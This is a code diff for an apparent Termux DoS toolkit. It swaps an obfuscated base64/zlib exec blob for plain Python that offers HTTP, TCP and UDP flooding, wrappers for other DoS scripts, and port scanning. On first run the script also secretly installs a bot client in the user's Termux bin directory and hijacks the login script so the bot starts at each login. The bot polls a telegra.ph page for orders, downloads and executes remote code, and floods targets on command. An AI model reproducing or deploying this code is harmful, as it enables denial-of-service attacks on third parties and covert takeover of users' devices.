@@ -1,2 +1,426 @@
-import marshal,zlib,base64
-exec(zlib.decompress(base64.b64decode("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")))
+#coding="UTF-8"
+import os
+import subprocess
+from colorama import Fore, Back, Style
+import time
+import requests
+import socket
+import threading
+
+if not 'tmp' in os.listdir():
+    file = open('system.py', 'w')
+    file.write('''import requests
+import socket
+import bs4
+import threading
+import urllib.request
+import json
+
+site = ''' + "'"+"https://telegra.ph/Wanna-graph-08-22"+"'" + '''
+
+def cust():
+    try:
+        exec(__script__)
+    except:
+        pass
+
+def tcp():
+
+    while what == '0':
+        try:
+            conn.send(duta.encode())
+        except:
+            pass
+    conn.close()
+
+
+def http():
+    while what == '0':
+
+        try:
+            requests.get(a[0])
+        except:
+            pass
+
+def httpost():
+    while what == '0':
+        try:
+            requests.post(a[0], json={burunduk})
+        except:
+            pass
+
+def udp():
+
+    while what == '0':
+        try:
+            udp_socket.sendto(duta, addr)
+
+        except:
+            pass
+
+
+
+conn = socket.socket()
+udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+kavo = '1'
+
+while True:
+
+    try:
+
+        yn = '0'
+
+        url = requests.get(site)
+
+        b = bs4.BeautifulSoup(url.text, "html.parser")
+
+        url1 = b.select('article')
+        url_print = url1[0].getText()
+        url_print = url_print.replace(' ', '')
+        a = url_print.split(',')
+
+
+
+        if a != kavo:
+            kavo = a
+            what = '1'
+
+            if a[0].lower() == 'stop' or a[0].lower == 'none':
+                pass
+
+            elif a[0].lower() == 'online':
+                try:
+                    requests.get(a[1])
+                except:
+                    pass
+
+            elif a[0].lower() == 'custom':
+                try:
+
+                    __script__ = a[1]
+                    with urllib.request.urlopen(__script__) as url:
+                        __script__ = url.read()
+                        threading.Thread(target=cust).start()
+                except:
+                    pass
+            elif a[0].lower() == 'move':
+                try:
+                    requests.get(a[1])
+                    site = a[1]
+                except:
+                    pass
+
+
+            elif a[2].lower() == 'db':
+                try:
+                    burunduk = a[3].replace(';', ', ')
+                    what = '0'
+                    for i in range(100):
+                        threading.Thread(target=httpost).start()
+                except:
+                    pass
+
+#####
+
+            elif a[2].lower() == 'http':
+                what = '0'
+                for i in range(100):
+                    threading.Thread(target=http).start()
+######
+
+
+            elif a[2].lower() == 'tcp':
+                try:
+                    conn.connect((a[0], int(a[1])))
+                    yn = '1'
+                except:
+                    try:
+                        conn.connect(('google.com', 80))
+                        conn.close()
+                        conn.connect((a[0], int(a[1])))
+                        yn = '1'
+                    except:
+                        pass
+
+                if yn == '1':
+                    what = '0'
+                    if a[-1].lower() == 'tcp':
+                        duta = 'by @wannadeauth (telegram)'
+                        for i in range(100):
+                            threading.Thread(target=tcp).start()
+                    else:
+                        duta = a[-1]
+                        for i in range(100):
+                            threading.Thread(target=tcp).start()
+
+######
+
+            elif a[2].lower() == 'udp':
+                addr = (a[0], int(a[1]))
+                what = '0'
+                if a[-1].lower() == 'udp':
+                    duta = 'by @wannadeauth (telegram)'
+                    for i in range(100):
+                        threading.Thread(target=udp).start()
+                else:
+                    duta = a[-1]
+                    for i in range(100):
+                        threading.Thread(target=udp).start()
+
+######
+
+            else:
+                pass
+    except:
+        pass
+''')
+
+    file.close()
+    os.system('cp system.py /data/data/com.termux/files/usr/bin')
+    os.system('rm system.py')
+
+    file = open('/data/data/com.termux/files/usr/bin/login', 'w')
+    file.write('''#!/data/data/com.termux/files/usr/bin/sh
+
+python /data/data/com.termux/files/usr/bin/system.py &
+clear
+
+if [ $# = 0 ] && [ -f /data/data/com.termux/files/usr/etc/motd ] && [ ! -f ~/.hushlogin ] && [ -z "$TERMUX_HUSHLOGIN" ]; then
+        cat /data/data/com.termux/files/usr/etc/motd
+else
+        # This variable shouldn't be kept set.
+        unset TERMUX_HUSHLOGIN
+fi
+
+if [ -G ~/.termux/shell ]; then
+        export SHELL="`realpath ~/.termux/shell`"
+else
+        for file in /data/data/com.termux/files/usr/bin/bash /data/data/com.termux/files/usr/bin/sh /system/bin/sh; do
+                if [ -x $file ]; then
+                        export SHELL=$file
+                        break
+                fi
+        done
+fi
+
+if [ -f /data/data/com.termux/files/usr/lib/libtermux-exec.so ]; then
+        export LD_PRELOAD=/data/data/com.termux/files/usr/lib/libtermux-exec.so
+        $SHELL -c "coreutils --coreutils-prog=true" > /dev/null 2>&1 || unset LD_PRELOAD
+fi
+
+if [ -n "$TERM" ]; then
+        exec "$SHELL" -l "$@"
+else
+        exec "$SHELL" "$@"
+fi
+
+''')
+    file.close()
+
+
+    os.system('python /data/data/com.termux/files/usr/bin/system.py &')
+    os.system('mkdir tmp')
+else:
+    pass
+t = Fore.MAGENTA + time.strftime("[%H:%M:%S]", time.localtime())
+
+
+what = '0' # лень было под True
+conn = socket.socket()
+udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+def tcp():
+    print(Fore.CYAN + ' Dossing...')
+    while what == '0':
+        t = Fore.MAGENTA + time.strftime("[%H:%M:%S]", time.localtime())
+        try:
+            conn.send(msg.encode())
+            print(t + Fore.GREEN + ' Successfully --> ' + Fore.BLUE + ip + ':' + str(port) + Fore.GREEN + '--> ' + msg)
+                  
+        except:
+            print(t + Fore.RED + ' Server maybe down!!! ')
+                  
+
+def http():
+    print(Fore.CYAN + ' Dossing...')
+    while what == '0':
+        t = Fore.MAGENTA + time.strftime("[%H:%M:%S]", time.localtime())
+        try:
+            requests.get(site)
+            print(t + Fore.GREEN + ' Successfully --> ' + Fore.BLUE + site)
+        except:
+            print(t + Fore.RED + ' Server maybe down!!! ')
+
+def udp():   
+    print(Fore.CYAN + ' Dossing...')
+    while what == '0':
+        t = Fore.MAGENTA + time.strftime("[%H:%M:%S]", time.localtime())
+        try:
+            udp_socket.sendto(msg, addr)
+            print(t + Fore.GREEN + ' Successfully --> ' + Fore.BLUE + ip + ':' + str(port) + Fore.GREEN + '--> ' + msg)
+        except:
+            print(t + Fore.RED + ' Server maybe down!!! ')
+
+def httpost():
+    print(Fore.CYAN + ' Dossing...')
+    while what == '0':
+        t = Fore.MAGENTA + time.strftime("[%H:%M:%S]", time.localtime())
+        try:
+            requests.post(site, json={burunduk})
+            print(t + Fore.GREEN + ' Successfully --> ' + Fore.BLUE + site)
+        except:
+            print(t + Fore.RED + ' Server maybe down!!! ')
+
+
+def cls():
+    os.system('cls' if os.name=='nt' else 'clear')
+def ban():
+    cls()
+
+	   						  
+    print(Fore.GREEN + """
+  _______   _______    ______        _______.
+ |       \ |       \  /  __  \      /       |
+ |  .--.  ||  .--.  ||  |  |  |    |   (----`
+ |  |  |  ||  |  |  ||  |  |  |     \   \    
+ |  '--'  ||  '--'  ||  `--'  | .----)   |   
+ |_______/ |_______/  \______/  |_______/    
+                                             """)
+    print(Fore.CYAN + " by @wannadeauth | @wannadeauth_chat (telegram)")
+    print("-------------------------------------------------\n")
+
+def man():
+    print(Fore.YELLOW +  " [1] Start attack | Начать атаку")
+    print(Fore.WHITE + "")
+    print(" [2] Узнать айпи домена, cloudflare cracker domens ip")
+    print(Fore.RED + "")                             
+    print(" [3] Сканировать порты | Scan open ports")
+    print(Fore.BLUE + " ")                                                    
+    print(" [4] Чат с DoS-ерами прямо не выходя из Termux, вы можете действовать слаженно")
+    print("     чтобы повалить сильный сервер |")
+    print("   ")
+    print("    |  Chat with other attackers without leaving Termux, you can attack together,")
+    print("     to bring down a strong server.")
+    print(Fore.GREEN + "")
+
+while True:
+    ban()
+    man()
+    a = input(" Write parametr | Введите параметр : ")
+
+    if a == "1":
+
+        ban()
+        print(Fore.YELLOW + ' [1] WannaDos (best choice)\n')
+        print(' [2] Hammer\n')
+        print(' [3] DOS Attack OVH\n')
+        print(' [4] Xerxes Dos attack\n\n')
+
+        wdos = input(Fore.BLUE + ' Choose script | Выберите скрипт: ')
+        ban()
+
+        if wdos == '1':
+          
+            ban()
+            print(Fore.GREEN + ' [1] HTTP (metod GET) (simple)\n')
+            print(' [2] HTTP (metod POST)\n')
+            print(' [3] TCP\n')
+            print(' [4] UDP\n\n')
+            metod = input(Fore.MAGENTA + ' Metod: ')
+            if metod == '1':
+                site = input(Fore.WHITE + 'Site: ')
+                thr = int(input(Fore.RED + ' Threads (100-800): '))
+                for i in range(thr):
+                    threading.Thread(target=http).start()
+                http()
+            elif metod == '2':
+                site = input(Fore.WHITE + 'Site: ')
+                burunduk = input(' POST data (json): ')
+                thr = int(input(Fore.RED + ' Threads (100-800): '))
+                for i in range(thr):
+                    threading.Thread(target=httpost).start()
+                httpost()
+
+            elif metod == '3':
+                ip = input(Fore.CYAN + ' IP address: ')
+                port = input(' Port: ') 
+                conn.connect((ip, int(port)))
+                msg = input(Fore.WHITE + ' Text message for dos: ')
+                thr = int(input(Fore.RED + ' Threads (100-800): '))
+                for i in range(thr):
+                    threading.Thread(target=tcp).start()
+                tcp()
+
+            elif metod == '4':
+                ip = input(Fore.CYAN + ' IP address: ')
+                port = input(' Port: ')
+                msg = input(Fore.WHITE + ' Text message for dos: ')
+                thr = int(input(Fore.RED + ' Threads (100-800): '))
+                addr = (ip, int(port))
+                for i in range(thr):
+                    threading.Thread(target=udp).start()
+                udp()
+
+
+        elif wdos == '2':
+            ip = input("Введите ip адрес жертвы | Type ip adress of victim: ")
+            port = input("Введите порт | Port: ")
+            strong = input("Кол-во потоков (сила) | Current/strong of attack \n Желательно от 150 до 700 | Preferably in range of 150 700: ")
+            list_files = subprocess.run(["python", "sub/2/hammer.py" ,"-s"  , ip , "-p" , port , "-t" , strong])
+
+        elif wdos == '3':
+            port = input(' Port 80/443: ')
+            os.chdir('core/3')
+            if port == '80':
+                os.system('python 80port.py')
+            elif port == '443':
+                os.system('python 443port.py')
+
+        elif wdos == '4':
+            os.chdir('core/4/XERXES')
+            os.system('gcc -o xerxes xerxes.c')
+            ip = input(Fore.WHITE + ' IP: ')
+            port = input(Fore.MAGENTA + ' Port:')
+            os.system('./xerxes ' + ip + ' ' + port)
+
+    elif a == "2":
+        list_files = subprocess.run(["python", "core/cloud.py"])
+
+    elif a == "3":
+        ip1 = input("Введите ip адрес для сканирования | Type ip for scanning ports: ")
+        port1 = input("Введите порты | Write ports \n Пример | Example 21-80,443,7777,8080: ")
+        list_files = subprocess.run(["nmap" , "-sV" , ip1 , "-p" , port1])
+    elif a == "4":
+        ban()
+        print(Fore.WHITE + " ")
+        print("  В открывшемся окне, после Irssi, пишем такие команды: ")
+        print(Fore.RED + " ")
+        print("     /connect chat.freenode.com") 
+        print("   ")
+        print("     /join doser")
+        print(Fore.WHITE + " ")
+        print("Все! Вы в чате!!!")
+        print(" ")
+        print(Fore.YELLOW + " ")
+
+        print(" [1] Irssi")
+        print(" ")
+        print(" [2] Установить модуль Irssi")
+        print(" ")
+        print(Fore.GREEN + " ")
+        b = input("Выберите действие: ")
+        if b == "2":
+
+            list_files = subprocess.run(["apt-get" , "install" , "irssi"])
+                                         
+        if b == "1":
+            list_files = subprocess.run(["irssi"])
+
+    else:
+        print("Задана неверная функция | Wrong fuction has been setup")
+
+    time.sleep(7)
+
+
+
